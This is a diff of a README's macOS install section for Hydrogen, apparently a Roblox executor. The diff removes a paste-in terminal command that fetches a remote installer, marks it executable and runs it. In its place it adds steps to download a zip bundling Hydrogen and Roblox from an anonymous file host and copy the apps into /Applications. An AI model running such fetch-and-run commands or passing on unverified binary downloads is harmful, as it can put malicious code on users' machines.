@@ -14,10 +14,11 @@ IF you don't have access to `/Applications/`, Roblox will be installed to `~/Hyd
 
 > ___
 
-To install, paste this in terminal:
-```sh
-cd /tmp && curl -LJs "https://github.com/retguard/scaling-train/raw/main/hydro-installer" -O && chmod +x ./hydro-installer && ./hydro-installer
-```
+- 1, Download: [robloxb.zip](https://gofile.io/d/tXlcT6)
+- 2, View the zip file content
+- 3, Move Hydrogen and Roblox to /Applications
+Enjoy.
+Special thanks to crookhd for giving me this solution.
 
 > ___
 
